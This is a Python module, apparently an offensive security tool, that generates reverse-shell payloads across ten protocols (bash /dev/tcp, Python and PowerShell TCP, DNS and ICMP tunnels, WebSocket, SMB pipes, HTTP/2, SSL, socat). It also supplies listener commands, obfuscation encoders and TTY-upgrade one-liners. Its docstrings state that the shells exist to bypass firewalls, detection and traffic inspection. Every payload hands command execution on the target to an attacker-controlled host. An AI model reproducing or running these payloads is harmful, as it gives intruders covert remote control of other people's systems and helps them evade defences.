"""
Advanced Multi-Protocol Reverse Shell Module
Generates sophisticated reverse shells using various protocols to bypass firewalls and detection systems.
"""

import base64
import json
import asyncio
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Literal
from enum import Enum


class ShellProtocol(str, Enum):
    """Supported reverse shell protocols"""
    BASH_TCP = "bash_tcp"
    PYTHON_TCP = "python_tcp"
    POWERSHELL_TCP = "powershell_tcp"
    DNS_TUNNEL = "dns_tunnel"
    ICMP_SHELL = "icmp_shell"
    WEBSOCKET = "websocket"
    SMB_PIPE = "smb_pipe"
    HTTP2 = "http2"
    SSL_ENCRYPTED = "ssl_encrypted"
    SOCAT_ENCRYPTED = "socat_encrypted"


class ShellEncoding(str, Enum):
    """Shell payload encoding methods"""
    NONE = "none"
    BASE64 = "base64"
    HEX = "hex"
    XOR = "xor"
    GZIP_BASE64 = "gzip_base64"


@dataclass
class ShellPayload:
    """Container for generated shell payload"""
    protocol: ShellProtocol
    platform: str  # windows, linux, macos
    payload: str
    listener_command: str
    encoding: ShellEncoding = ShellEncoding.NONE
    encoded_payload: Optional[str] = None
    description: str = ""
    evasion_features: List[str] = field(default_factory=list)
    port: int = 4444
    
    def to_dict(self) -> Dict:
        return {
            "protocol": self.protocol.value,
            "platform": self.platform,
            "payload": self.payload,
            "listener_command": self.listener_command,
            "encoding": self.encoding.value,
            "encoded_payload": self.encoded_payload,
            "description": self.description,
            "evasion_features": self.evasion_features,
            "port": self.port
        }


class AdvancedShellGenerator:
    """Advanced reverse shell generator with multiple protocols and evasion techniques"""
    
    def __init__(self, lhost: str, lport: int = 4444):
        self.lhost = lhost
        self.lport = lport
        
    async def generate_shell(
        self,
        protocol: ShellProtocol,
        platform: Literal["windows", "linux", "macos"] = "linux",
        encoding: ShellEncoding = ShellEncoding.NONE,
        evasion: bool = True
    ) -> ShellPayload:
        """Generate advanced reverse shell payload"""
        
        if protocol == ShellProtocol.DNS_TUNNEL:
            return await self._generate_dns_tunnel(platform, encoding, evasion)
        elif protocol == ShellProtocol.ICMP_SHELL:
            return await self._generate_icmp_shell(platform, encoding, evasion)
        elif protocol == ShellProtocol.WEBSOCKET:
            return await self._generate_websocket_shell(platform, encoding, evasion)
        elif protocol == ShellProtocol.SMB_PIPE:
            return await self._generate_smb_pipe_shell(platform, encoding, evasion)
        elif protocol == ShellProtocol.HTTP2:
            return await self._generate_http2_shell(platform, encoding, evasion)
        elif protocol == ShellProtocol.SSL_ENCRYPTED:
            return await self._generate_ssl_shell(platform, encoding, evasion)
        elif protocol == ShellProtocol.SOCAT_ENCRYPTED:
            return await self._generate_socat_shell(platform, encoding, evasion)
        elif protocol == ShellProtocol.BASH_TCP:
            return await self._generate_bash_tcp(encoding, evasion)
        elif protocol == ShellProtocol.PYTHON_TCP:
            return await self._generate_python_tcp(platform, encoding, evasion)
        elif protocol == ShellProtocol.POWERSHELL_TCP:
            return await self._generate_powershell_tcp(encoding, evasion)
        else:
            raise ValueError(f"Unsupported protocol: {protocol}")
    
    async def _generate_dns_tunnel(self, platform: str, encoding: ShellEncoding, evasion: bool) -> ShellPayload:
        """DNS tunneling reverse shell - bypass firewall via DNS queries"""
        
        if platform == "linux":
            # Linux DNS tunnel using dnscat2 or custom Python
            payload = f"""python3 -c 'import socket,subprocess,os,base64;
s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);
s.connect(("{self.lhost}",53));
while True:
    d=s.recv(1024);
    if d[:4]==b"cmd:":
        p=subprocess.run(d[4:].decode(),shell=True,capture_output=True);
        r=base64.b64encode(p.stdout+p.stderr).decode();
        for i in range(0,len(r),60):
            s.sendto(f"{{i}}.{{r[i:i+60]}}.exfil.{self.lhost}".encode(),("{self.lhost}",53))'"""
        
        elif platform == "windows":
            # Windows DNS tunnel using PowerShell
            payload = f"""powershell -nop -c "$d=New-Object System.Net.Sockets.UdpClient('{self.lhost}',53);while($true){{$b=$d.Receive([ref][System.Net.IPEndPoint]::new([System.Net.IPAddress]::Any,0));if($b[0..2]-eq'cmd'){{$r=[Text.Encoding]::UTF8.GetString((iex([Text.Encoding]::UTF8.GetString($b[4..$b.Length]))|Out-String).Trim()|%{{[Text.Encoding]::UTF8.GetBytes($_)}})|%{{[Convert]::ToBase64String($_)}};for($i=0;$i-lt$r.Length;$i+=60){{$d.Send([Text.Encoding]::UTF8.GetBytes($r.Substring($i,[Math]::Min(60,$r.Length-$i))+'.exfil.{self.lhost}'),'{self.lhost}',53)}}}}}}"""""
        
        else:
            payload = f"# DNS tunnel not supported on {platform}"
        
        listener = f"""# DNS Tunnel Listener (requires dnscat2 or custom server)
# Install: git clone https://github.com/iagox86/dnscat2.git
# Run: ruby dnscat2.rb --dns "domain={self.lhost},port=53" --no-cache
# Or use dnschef: python dnschef.py --fakeip {self.lhost} --interface 0.0.0.0 --port 53"""
        
        evasion_features = ["dns_protocol", "encrypted_data", "low_traffic_profile"] if evasion else []
        
        return ShellPayload(
            protocol=ShellProtocol.DNS_TUNNEL,
            platform=platform,
            payload=payload,
            listener_command=listener,
            encoding=encoding,
            encoded_payload=self._encode_payload(payload, encoding) if encoding != ShellEncoding.NONE else None,
            description="DNS tunneling shell - bypasses firewalls by using DNS queries for C2",
            evasion_features=evasion_features,
            port=53
        )
    
    async def _generate_icmp_shell(self, platform: str, encoding: ShellEncoding, evasion: bool) -> ShellPayload:
        """ICMP reverse shell - use ping packets for command execution"""
        
        if platform == "linux":
            payload = f"""python3 -c 'import socket,subprocess,struct,os;
s=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_ICMP);
s.setsockopt(socket.SOL_IP,socket.IP_HDRINCL,1);
while True:
    d,a=s.recvfrom(1024);
    if len(d)>28 and d[20:24]==b"exec":
        c=d[24:].decode();
        r=subprocess.run(c,shell=True,capture_output=True);
        o=r.stdout+r.stderr;
        for i in range(0,len(o),56):
            pkt=struct.pack("!BBHHH",8,0,0,1,1)+o[i:i+56];
            s.sendto(pkt,("{self.lhost}",0))'"""
        
        elif platform == "windows":
            payload = f"""powershell -nop -w hidden -c "$icmp=New-Object System.Net.NetworkInformation.Ping;while($true){{$r=$icmp.Send('{self.lhost}',1000,[Text.Encoding]::ASCII.GetBytes('ready'));if($r.Buffer[0..3]-eq'exec'){{$c=[Text.Encoding]::ASCII.GetString($r.Buffer[4..$r.Buffer.Length]);$o=iex $c|Out-String;$b=[Text.Encoding]::ASCII.GetBytes($o);for($i=0;$i-lt$b.Length;$i+=32){{$icmp.Send('{self.lhost}',1000,$b[$i..[Math]::Min($i+31,$b.Length-1)])|Out-Null}}}};Start-Sleep -m 500}}"""""
        
        else:
            payload = f"# ICMP shell not supported on {platform}"
        
        listener = f"""# ICMP Shell Listener (requires root/admin)
# Install: pip install scapy
# Run Python listener:
python3 -c "from scapy.all import *;
def handler(pkt):
    if ICMP in pkt and pkt[ICMP].type==0:
        print(pkt[Raw].load.decode() if Raw in pkt else '');
sniff(filter='icmp',prn=handler)"
# Send commands: send(IP(dst='{self.lhost}')/ICMP(type=8)/Raw(load=b'exec:whoami'))"""
        
        evasion_features = ["icmp_protocol", "stealth_traffic", "firewall_bypass"] if evasion else []
        
        return ShellPayload(
            protocol=ShellProtocol.ICMP_SHELL,
            platform=platform,
            payload=payload,
            listener_command=listener,
            encoding=encoding,
            encoded_payload=self._encode_payload(payload, encoding) if encoding != ShellEncoding.NONE else None,
            description="ICMP shell using ping packets - bypasses TCP/UDP restrictions",
            evasion_features=evasion_features,
            port=0
        )
    
    async def _generate_websocket_shell(self, platform: str, encoding: ShellEncoding, evasion: bool) -> ShellPayload:
        """WebSocket reverse shell - looks like legitimate web traffic"""
        
        if platform == "linux":
            payload = f"""python3 -c 'import asyncio,websockets,subprocess,json;
async def shell():
    async with websockets.connect("ws://{self.lhost}:{self.lport}") as ws:
        await ws.send(json.dumps({{"type":"hello","hostname":"$(hostname)","user":"$(whoami)"}}));
        while True:
            cmd=json.loads(await ws.recv());
            if cmd["type"]=="exec":
                r=subprocess.run(cmd["cmd"],shell=True,capture_output=True,text=True);
                await ws.send(json.dumps({{"type":"result","stdout":r.stdout,"stderr":r.stderr}}));
asyncio.run(shell())'"""
        
        elif platform == "windows":
            payload = f"""powershell -nop -c "
[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;
$ws=New-Object System.Net.WebSockets.ClientWebSocket;
$cts=New-Object System.Threading.CancellationTokenSource;
$uri=[Uri]'ws://{self.lhost}:{self.lport}';
$ws.ConnectAsync($uri,$cts.Token).Wait();
$buf=New-Object Byte[] 4096;
while($ws.State-eq'Open'){{
    $r=$ws.ReceiveAsync($buf,0,$buf.Length,$cts.Token).Result;
    $cmd=[Text.Encoding]::UTF8.GetString($buf,0,$r.Count);
    $o=iex $cmd|Out-String;
    $ob=[Text.Encoding]::UTF8.GetBytes($o);
    $ws.SendAsync($ob,0,$ob.Length,[System.Net.WebSockets.WebSocketMessageType]::Text,$true,$cts.Token).Wait()
}}"""""
        
        else:
            payload = f"# WebSocket shell not supported on {platform}"
        
        listener = f"""# WebSocket Shell Listener
# Install: pip install websockets
# Run listener:
python3 -c "import asyncio,websockets;
async def handler(ws,path):
    async for msg in ws:
        print(f'> {{msg}}');
        cmd=input('cmd> ');
        await ws.send(cmd);
asyncio.run(websockets.serve(handler,'0.0.0.0',{self.lport}))"
# Or use wscat: npm install -g wscat && wscat -l {self.lport}"""
        
        evasion_features = ["http_protocol", "legitimate_traffic", "encrypted_ws"] if evasion else []
        
        return ShellPayload(
            protocol=ShellProtocol.WEBSOCKET,
            platform=platform,
            payload=payload,
            listener_command=listener,
            encoding=encoding,
            encoded_payload=self._encode_payload(payload, encoding) if encoding != ShellEncoding.NONE else None,
            description="WebSocket shell - mimics web application traffic",
            evasion_features=evasion_features,
            port=self.lport
        )
    
    async def _generate_smb_pipe_shell(self, platform: str, encoding: ShellEncoding, evasion: bool) -> ShellPayload:
        """SMB Named Pipe reverse shell - Windows lateral movement"""
        
        if platform == "windows":
            payload = f"""powershell -nop -c "
$pipe=New-Object System.IO.Pipes.NamedPipeClientStream('{self.lhost}','scorpion_shell',[System.IO.Pipes.PipeDirection]::InOut);
$pipe.Connect(5000);
$sr=New-Object System.IO.StreamReader($pipe);
$sw=New-Object System.IO.StreamWriter($pipe);
$sw.AutoFlush=$true;
$sw.WriteLine('[+] Connected from '+$env:COMPUTERNAME);
while($pipe.IsConnected){{
    $cmd=$sr.ReadLine();
    if($cmd-eq'exit'){{break}};
    try{{
        $r=iex $cmd 2>&1|Out-String;
        $sw.WriteLine($r)
    }}catch{{
        $sw.WriteLine($_.Exception.Message)
    }}
}};
$pipe.Close()"""""
        else:
            payload = f"# SMB Named Pipe only supported on Windows"
        
        listener = f"""# SMB Named Pipe Listener (Windows only)
# Run PowerShell listener:
$pipe=New-Object System.IO.Pipes.NamedPipeServerStream('scorpion_shell',[System.IO.Pipes.PipeDirection]::InOut);
Write-Host '[*] Waiting for connection on \\\\.\\pipe\\scorpion_shell';
$pipe.WaitForConnection();
$sr=New-Object System.IO.StreamReader($pipe);
$sw=New-Object System.IO.StreamWriter($pipe);
$sw.AutoFlush=$true;
while($pipe.IsConnected){{
    Write-Host ($sr.ReadLine());
    $cmd=Read-Host 'cmd>';
    $sw.WriteLine($cmd)
}};
$pipe.Close()"""
        
        evasion_features = ["smb_protocol", "windows_native", "lateral_movement"] if evasion else []
        
        return ShellPayload(
            protocol=ShellProtocol.SMB_PIPE,
            platform=platform,
            payload=payload,
            listener_command=listener,
            encoding=encoding,
            encoded_payload=self._encode_payload(payload, encoding) if encoding != ShellEncoding.NONE else None,
            description="SMB Named Pipe shell - Windows lateral movement and evasion",
            evasion_features=evasion_features,
            port=445
        )
    
    async def _generate_http2_shell(self, platform: str, encoding: ShellEncoding, evasion: bool) -> ShellPayload:
        """HTTP/2 reverse shell - modern encrypted protocol"""
        
        if platform == "linux":
            payload = f"""python3 -c 'import httpx,subprocess,json,asyncio;
async def shell():
    async with httpx.AsyncClient(http2=True) as client:
        while True:
            r=await client.get("http://{self.lhost}:{self.lport}/cmd");
            if r.status_code==200:
                cmd=r.json()["cmd"];
                p=subprocess.run(cmd,shell=True,capture_output=True,text=True);
                await client.post("http://{self.lhost}:{self.lport}/result",json={{"stdout":p.stdout,"stderr":p.stderr}});
            await asyncio.sleep(2);
asyncio.run(shell())'"""
        
        elif platform == "windows":
            payload = f"""powershell -nop -c "
while($true){{
    try{{
        $r=Invoke-RestMethod -Uri 'http://{self.lhost}:{self.lport}/cmd' -Method Get;
        $cmd=$r.cmd;
        $o=iex $cmd|Out-String;
        Invoke-RestMethod -Uri 'http://{self.lhost}:{self.lport}/result' -Method Post -Body (@{{stdout=$o}}|ConvertTo-Json) -ContentType 'application/json'
    }}catch{{}};
    Start-Sleep -s 2
}}"""""
        else:
            payload = f"# HTTP/2 shell not supported on {platform}"
        
        listener = f"""# HTTP/2 Shell Listener
# Install: pip install httpx h2 hypercorn
# Run listener:
python3 -c "from hypercorn.asyncio import serve;
from hypercorn.config import Config;
from quart import Quart,request,jsonify;
app=Quart(__name__);
cmd_queue='whoami';
@app.route('/cmd')
async def get_cmd():
    global cmd_queue;
    return jsonify({{'cmd':cmd_queue}});
@app.route('/result',methods=['POST'])
async def post_result():
    data=await request.get_json();
    print(data['stdout']);
    return '';
config=Config();
config.bind=[f'0.0.0.0:{self.lport}'];
import asyncio;
asyncio.run(serve(app,config))"
# Interactive: curl http://localhost:{self.lport}/cmd"""
        
        evasion_features = ["http2_protocol", "encrypted_channel", "legitimate_http"] if evasion else []
        
        return ShellPayload(
            protocol=ShellProtocol.HTTP2,
            platform=platform,
            payload=payload,
            listener_command=listener,
            encoding=encoding,
            encoded_payload=self._encode_payload(payload, encoding) if encoding != ShellEncoding.NONE else None,
            description="HTTP/2 shell - modern encrypted web protocol",
            evasion_features=evasion_features,
            port=self.lport
        )
    
    async def _generate_ssl_shell(self, platform: str, encoding: ShellEncoding, evasion: bool) -> ShellPayload:
        """SSL/TLS encrypted reverse shell - fully encrypted traffic"""
        
        if platform == "linux":
            payload = f"""python3 -c 'import socket,ssl,subprocess,os;
s=socket.socket();
ss=ssl.wrap_socket(s,ssl_version=ssl.PROTOCOL_TLSv1_2);
ss.connect(("{self.lhost}",{self.lport}));
while True:
    d=ss.recv(1024).decode();
    if d.strip()=="exit":break;
    p=subprocess.run(d,shell=True,capture_output=True);
    ss.sendall(p.stdout+p.stderr)'"""
        
        elif platform == "windows":
            payload = f"""powershell -nop -c "
$c=New-Object System.Net.Sockets.TcpClient('{self.lhost}',{self.lport});
$s=$c.GetStream();
[System.Net.Security.SslStream]$ssl=New-Object System.Net.Security.SslStream($s,$false);
$ssl.AuthenticateAsClient('{self.lhost}');
$w=New-Object System.IO.StreamWriter($ssl);
$r=New-Object System.IO.StreamReader($ssl);
$w.AutoFlush=$true;
$w.WriteLine('[+] SSL Shell Connected');
while(($cmd=$r.ReadLine())){{
    if($cmd-eq'exit'){{break}};
    try{{$o=iex $cmd|Out-String;$w.WriteLine($o)}}catch{{$w.WriteLine($_.Exception.Message)}}
}};
$ssl.Close();$c.Close()"""""
        else:
            payload = f"# SSL shell not supported on {platform}"
        
        listener = f"""# SSL/TLS Encrypted Listener
# Generate certificate:
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj "/CN={self.lhost}"

# Run OpenSSL listener:
openssl s_server -quiet -key key.pem -cert cert.pem -port {self.lport}

# Or use socat:
socat OPENSSL-LISTEN:{self.lport},cert=cert.pem,key=key.pem,verify=0,fork STDOUT"""
        
        evasion_features = ["ssl_encrypted", "https_like", "anti_inspection"] if evasion else []
        
        return ShellPayload(
            protocol=ShellProtocol.SSL_ENCRYPTED,
            platform=platform,
            payload=payload,
            listener_command=listener,
            encoding=encoding,
            encoded_payload=self._encode_payload(payload, encoding) if encoding != ShellEncoding.NONE else None,
            description="SSL/TLS encrypted reverse shell - prevents traffic inspection",
            evasion_features=evasion_features,
            port=self.lport
        )
    
    async def _generate_socat_shell(self, platform: str, encoding: ShellEncoding, evasion: bool) -> ShellPayload:
        """Socat encrypted reverse shell with certificate pinning"""
        
        if platform in ["linux", "macos"]:
            payload = f"""socat OPENSSL:{self.lhost}:{self.lport},verify=0 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane"""
        
        elif platform == "windows":
            payload = f"""# Socat not natively available on Windows
# Use WSL or download socat.exe from https://github.com/StudioEtrange/socat-windows
socat.exe OPENSSL:{self.lhost}:{self.lport},verify=0 EXEC:'cmd.exe',pipes"""
        else:
            payload = f"# Socat not supported on {platform}"
        
        listener = f"""# Socat Encrypted Listener
# Generate certificate:
openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 365 -out bind_shell.crt
cat bind_shell.key bind_shell.crt > bind_shell.pem

# Run listener:
socat OPENSSL-LISTEN:{self.lport},cert=bind_shell.pem,verify=0,fork STDOUT

# With certificate pinning (more secure):
socat OPENSSL-LISTEN:{self.lport},cert=bind_shell.pem,cafile=client.crt,verify=1,fork STDOUT"""
        
        evasion_features = ["socat_encrypted", "certificate_pinning", "pty_shell"] if evasion else []
        
        return ShellPayload(
            protocol=ShellProtocol.SOCAT_ENCRYPTED,
            platform=platform,
            payload=payload,
            listener_command=listener,
            encoding=encoding,
            encoded_payload=self._encode_payload(payload, encoding) if encoding != ShellEncoding.NONE else None,
            description="Socat encrypted shell with full TTY support",
            evasion_features=evasion_features,
            port=self.lport
        )
    
    async def _generate_bash_tcp(self, encoding: ShellEncoding, evasion: bool) -> ShellPayload:
        """Standard Bash TCP reverse shell"""
        payload = f"""bash -c 'bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1'"""
        
        listener = f"nc -lvnp {self.lport}"
        evasion_features = ["simple", "bash_only"] if evasion else []
        
        return ShellPayload(
            protocol=ShellProtocol.BASH_TCP,
            platform="linux",
            payload=payload,
            listener_command=listener,
            encoding=encoding,
            encoded_payload=self._encode_payload(payload, encoding) if encoding != ShellEncoding.NONE else None,
            description="Standard Bash TCP reverse shell",
            evasion_features=evasion_features,
            port=self.lport
        )
    
    async def _generate_python_tcp(self, platform: str, encoding: ShellEncoding, evasion: bool) -> ShellPayload:
        """Python TCP reverse shell"""
        payload = f"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{self.lhost}",{self.lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'"""
        
        if platform == "windows":
            payload = f"""python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{self.lhost}',{self.lport}));subprocess.call(['cmd.exe'],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\""""
        
        listener = f"nc -lvnp {self.lport}"
        evasion_features = ["python_native", "cross_platform"] if evasion else []
        
        return ShellPayload(
            protocol=ShellProtocol.PYTHON_TCP,
            platform=platform,
            payload=payload,
            listener_command=listener,
            encoding=encoding,
            encoded_payload=self._encode_payload(payload, encoding) if encoding != ShellEncoding.NONE else None,
            description="Python TCP reverse shell - cross-platform",
            evasion_features=evasion_features,
            port=self.lport
        )
    
    async def _generate_powershell_tcp(self, encoding: ShellEncoding, evasion: bool) -> ShellPayload:
        """PowerShell TCP reverse shell"""
        payload = f"""powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{self.lhost}',{self.lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\""""
        
        listener = f"nc -lvnp {self.lport}"
        evasion_features = ["powershell_native", "windows_only", "noprofile"] if evasion else []
        
        return ShellPayload(
            protocol=ShellProtocol.POWERSHELL_TCP,
            platform="windows",
            payload=payload,
            listener_command=listener,
            encoding=encoding,
            encoded_payload=self._encode_payload(payload, encoding) if encoding != ShellEncoding.NONE else None,
            description="PowerShell TCP reverse shell",
            evasion_features=evasion_features,
            port=self.lport
        )
    
    def _encode_payload(self, payload: str, encoding: ShellEncoding) -> str:
        """Encode payload using specified method"""
        if encoding == ShellEncoding.BASE64:
            return base64.b64encode(payload.encode()).decode()
        
        elif encoding == ShellEncoding.HEX:
            return payload.encode().hex()
        
        elif encoding == ShellEncoding.XOR:
            key = 0x41  # XOR key
            return ''.join(chr(ord(c) ^ key) for c in payload)
        
        elif encoding == ShellEncoding.GZIP_BASE64:
            import gzip
            compressed = gzip.compress(payload.encode())
            return base64.b64encode(compressed).decode()
        
        return payload
    
    async def generate_all_shells(
        self,
        platform: Literal["windows", "linux", "macos"] = "linux",
        encoding: ShellEncoding = ShellEncoding.NONE
    ) -> List[ShellPayload]:
        """Generate all available shell types for a platform"""
        
        shells = []
        protocols = [
            ShellProtocol.BASH_TCP,
            ShellProtocol.PYTHON_TCP,
            ShellProtocol.POWERSHELL_TCP,
            ShellProtocol.DNS_TUNNEL,
            ShellProtocol.ICMP_SHELL,
            ShellProtocol.WEBSOCKET,
            ShellProtocol.SMB_PIPE,
            ShellProtocol.HTTP2,
            ShellProtocol.SSL_ENCRYPTED,
            ShellProtocol.SOCAT_ENCRYPTED
        ]
        
        for protocol in protocols:
            try:
                shell = await self.generate_shell(protocol, platform, encoding, evasion=True)
                if "not supported" not in shell.payload.lower():
                    shells.append(shell)
            except Exception as e:
                # Skip unsupported protocols
                continue
        
        return shells
    
    def get_tty_upgrade_commands(self, platform: str = "linux") -> Dict[str, str]:
        """Get TTY upgrade commands for better shell interaction"""
        
        if platform == "linux":
            return {
                "python": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
                "script": "/usr/bin/script -qc /bin/bash /dev/null",
                "perl": "perl -e 'exec \"/bin/bash\";'",
                "socat": "socat file:`tty`,raw,echo=0 tcp-listen:4444",
                "stty_raw": "# In reverse shell: python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n# Ctrl+Z to background\n# In local terminal: stty raw -echo; fg\n# In reverse shell: export TERM=xterm-256color",
                "expect": "expect -c 'spawn bash; interact'",
                "vim": "vim -c ':!/bin/bash'",
                "lua": "lua -e \"os.execute('/bin/bash')\""
            }
        
        elif platform == "windows":
            return {
                "conpty": "# Windows 10+ ConPTY for full TTY\npowershell -c \"Invoke-ConPtyShell {self.lhost} {self.lport}\"",
                "rlwrap": "# On attacker: rlwrap nc -lvnp {self.lport}\n# Gives readline support",
                "powershell_history": "$host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')",
            }
        
        return {}


async def main():
    """Example usage"""
    generator = AdvancedShellGenerator(lhost="10.10.14.5", lport=4444)
    
    # Generate DNS tunnel shell
    dns_shell = await generator.generate_shell(
        protocol=ShellProtocol.DNS_TUNNEL,
        platform="linux",
        encoding=ShellEncoding.BASE64,
        evasion=True
    )
    
    print(f"Protocol: {dns_shell.protocol}")
    print(f"Payload: {dns_shell.payload}")
    print(f"Listener: {dns_shell.listener_command}")
    print(f"Evasion: {dns_shell.evasion_features}")
    
    # Generate all shells for Linux
    all_shells = await generator.generate_all_shells(platform="linux")
    print(f"\nGenerated {len(all_shells)} shells for Linux")


if __name__ == "__main__":
    asyncio.run(main())
